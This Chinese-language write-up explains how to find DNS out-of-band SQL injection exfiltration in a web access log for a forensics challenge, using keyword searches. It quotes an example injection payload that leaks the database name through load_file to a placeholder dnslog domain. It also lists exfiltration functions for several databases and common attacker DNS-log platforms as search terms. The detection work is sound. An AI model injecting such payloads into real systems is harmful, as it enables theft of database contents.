DNS外带SQL注入解题思路

应急响应 2026-07-08 1776 字 约 5 分钟
SQL注入DNSOOB解题思路

题目特征识别

这类题目一般描述中会给几个关键词：
- "异常的 DNS 查询记录"
- "绕过检测将数据外传"
- "数据库敏感信息外传"

看到这些词，直接锁定 → DNS OOB 外带数据（Out-Off-Band Data Exfiltration）

核心思路：三步定位法

Step 1：缩小范围，不读全文

access.log 文件很大（本例 43000+ 行），你不需要逐行读。直接搜索关键词：

① 搜索 DNS 外传的典型函数：

load_file
LOAD_FILE

这是 MySQL DNS 外传的核心函数，通过 UNC 路径触发 DNS 查询。

② 搜索常见 DNS 日志平台域名：

dnslog
ceye
burpcollaborator
interactsh

攻击者常用的 DNS Log 平台，用来接收 DNS 请求记录。

③ 搜索 UNC 路径特征：

%5C%5C   （URL编码的双反斜杠 \\）
\\\\     （原始日志中的双反斜杠）

④ 如果你在 Windows 环境用工具：

# 在 Wireshark/终端模拟器 中
Ctrl+F → 搜索 load_file

# 或者用命令行（不打开文件）
findstr /I "load_file dnslog ceye" access.log

# Linux/Mac
grep -i "load_file\|dnslog\|ceye" access.log

关键技巧：不要读全文，不要从头翻，直接搜索这几个关键词就能定位到关键行。

Step 2：定位到关键行后提取域名

找到类似这样的行：

203.0.113.88 [14:02:30] GET /search?q=1' AND (SELECT load_file(concat('\\\\',
(select database()),'.XXXXXXX.dnslog.cn\\abc'))) --

从中提取接收域名：XXXXXXX.dnslog.cn

这条 SQL 的意思是：
- LOAD_FILE('\\数据库名.XXXXXXX.dnslog.cn\abc')
- MySQL 试图读取这个 UNC 路径时，会向 XXXXXXX.dnslog.cn 发 DNS 查询
- 数据库名被携带在子域名中，攻击者的 DNS 服务器收到查询就拿到了数据

Step 3：确认答案

接收数据的域名 = XXXXXXX.dnslog.cn

如果不能直接搜到关键词怎么办？

如果搜 load_file 没结果，说明攻击者用了其他 OOB 技术，换思路：

不同数据库的 DNS 外传函数

数据库 DNS 外传函数 搜索关键词
MySQL LOAD_FILE() load_file
SQL Server xp_dirtree xp_fileexist xp_dirtree
Oracle UTL_HTTP UTL_INADDR utl_http
PostgreSQL COPY + dblink dblink_connect

不同工具的 payload 特征

工具 DNS 域名特征
sqlmap 默认使用 burpcollaborator 或随机域名
手工/其他工具 常用 dnslog.cn ceye.io interactsh
自定义 攻击者自己的域名

实在搜不到怎么办？

先找 SQL 注入点 → 看哪个参数被注入 → 在注入点附近找包含 .com .cn .io 等域名的行

grep -i "\.com\|\.cn\|\.io" access.log | grep "?"

方法论总结

1. 识别题型 → DNS外带/OOB → 搜 load_file / dnslog / %5C%5C
                        ↓
                 找到了 → 提取域名 → 完成
                        ↓
                 没找到 → 换关键词
                        ↓
                  搜 xp_dirtree / utl_http / 域名特征
                        ↓
                 还是没找到 → 先找 SQL注入点，再在注入点附近搜域名

核心原则：
- 不要从头读大文件，用搜索
- 用关键词缩小范围后再看上下文
- 根据数据库类型选不同的搜索词
